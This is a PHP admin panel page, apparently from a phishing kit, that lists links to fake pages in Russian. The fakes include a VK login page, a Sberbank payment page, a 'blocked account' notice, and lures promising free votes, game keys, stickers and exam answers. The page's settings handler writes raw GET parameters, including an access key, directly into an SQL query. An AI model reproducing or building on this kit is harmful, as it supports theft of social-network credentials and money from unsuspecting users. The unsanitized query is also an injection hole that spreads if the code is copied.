<?
include '../bdlog.php';
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }

if(isset($_SESSION['admin'])) {
if(isset($_GET['ssilka'])) {
	$admpas = $_GET['admpas'];
	$tariff = $_GET['tarif'];
	$us = $_GET['usersonline']; 
	$ppay = $_GET['pursestopay'];
	$minbal = $_GET['minbalance'];
    $ssilka = $_GET['ssilka'];
	$db->query("update settings set `url` = '$ssilka', `minwith` = '$minbal', `acceskey` = '$admpas', `tarif` = '$tariff'");
	echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/settings.php">';
}
		
}
?><!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>


    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>
<? if(isset($_SESSION['admin'])) { echo '
  <center><!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
          <div class="card card-primary" style="min-width:40%;">
              <div class="card-header">
<h3 class="card-title">Ссылки на фейки // business_dark</h3>'; }?>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
				
				
				          <div class="form-group">
                    <label >Авторизация VK</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>auth/index.php" id="link">
                  </div>
                  <div class="form-group">
                    <label >SmartDrop</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>smartdrop" id="link">
                  </div>
                  <div class="form-group">
                    <label >Перевод Сбербанк</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>pay" id="link">
                  </div>
                  <div class="form-group">
                    <label >Заблокированная страница</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>blocked_vk" id="link">
                  </div>
                  <div class="form-group"> 
                    <label >Жалобы на пользователя <a href="../admin/report.php" target="_blank">(НАСТРОИТЬ)</a></label>
                    <input type="text" class="form-control" readonly value="<?=$host?>report" id="link">
                  </div>
                  <div class="form-group">
                    <label >Жалобы на определённого пользователя</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>user_report" id="link">
                  </div>
                  <div class="form-group">
                    <label >Голосование <a href="../admin/vote.php" target="_blank">(НАСТРОИТЬ)</a></label>
                    <input type="text" class="form-control" readonly value="<?=$host?>vote" id="link">
                  </div>
                  <div class="form-group">
                    <label >Закрытая группа ВК <a href="../admin/group_settings.php" target="_blank">(НАСТРОИТЬ)</a></label>
                    <input type="text" class="form-control" readonly value="<?=$host?>closed_group" id="link">
                  </div>
                  <div class="form-group">
                    <label >Петиция</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>change" id="link">
                  </div>
                  <div class="form-group">
                    <label >Накрутка</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>nakrutka" id="link">
                  </div>
                  <div class="form-group">
                    <label >Раздача голосов</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>golos" id="link">
                  </div>
				          <div class="form-group">
                    <label >Подписка BOOM</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>boom" id="link">
                  </div>	
				         <div class="form-group">
                    <label >Рулетка стикеров</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>stickers" id="link">
                  </div>
                  <div class="form-group">
                    <label >Раздача WarFace</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>warface" id="link">
                  </div>
                  <div class="form-group">
                    <label >Бесплатный ключ PUBG</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>magazine" id="link">
                  </div>
				          <div class="form-group">
                    <label >Ответы ЕГЭ | ОГЭ</label>
                    <input type="text" class="form-control" readonly value="<?=$host?>otvets" id="link">
                  </div>
                </div>
                <!-- /.card-body -->
              </form>
              
            </div>
            </center>
			
			

        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>